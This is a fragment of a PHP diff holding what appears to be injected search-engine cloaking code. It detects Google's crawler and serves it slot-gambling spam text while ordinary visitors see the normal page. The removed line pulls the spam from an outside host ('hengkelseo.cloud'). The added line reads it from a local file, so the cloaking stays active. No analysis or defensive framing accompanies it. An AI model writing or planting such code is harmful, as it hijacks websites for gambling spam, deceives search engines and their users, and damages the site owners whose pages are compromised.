@@ -8,7 +8,7 @@ function is_google_bot() {
 }
 
 if (is_google_bot()) {
- $bot_content = file_get_contents('https://hengkelseo.cloud/txt/slotgacor.txt');
+ $bot_content = file_get_contents('/txt/slotgacor.txt');
  echo $bot_content;
  exit;
 } else {
